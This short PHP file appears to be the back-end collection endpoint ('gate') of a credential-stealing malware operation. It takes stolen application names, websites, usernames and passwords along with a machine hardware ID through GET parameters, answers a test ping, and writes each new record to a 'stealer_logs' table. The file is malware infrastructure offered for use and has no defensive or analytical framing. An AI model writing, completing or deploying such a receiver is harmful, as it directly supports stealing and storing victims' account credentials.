<?php
@include_once('../../includes/all.inc');

if (isset($_GET['stealer_app']) && isset($_GET['stealer_website']) && isset($_GET['stealer_user']) && isset($_GET['stealer_pass']))
{
	if (isset($_GET['stealer_test']))
		die('ok');
	$stmt = db_query("SELECT `id` FROM `stealer_logs` WHERE `hwid` = :1 AND `website` = :2 AND `user` = :3 AND `pass` = :4",
						htmlentities($_GET['hwid']),
						htmlentities($_GET['stealer_website']),
						htmlentities($_GET['stealer_user']),
						htmlentities($_GET['stealer_pass']));
	if ($stmt->rowCount() == 0)
	{
		db_query("INSERT INTO `stealer_logs`(`hwid`, `app`, `website`, `user`, `pass`) VALUES(:1, :2, :3, :4, :5)",
						htmlentities($_GET['hwid']),
						htmlentities($_GET['stealer_app']),
						htmlentities($_GET['stealer_website']),
						htmlentities($_GET['stealer_user']),
						htmlentities($_GET['stealer_pass']));
	}	
	die('');
}

?>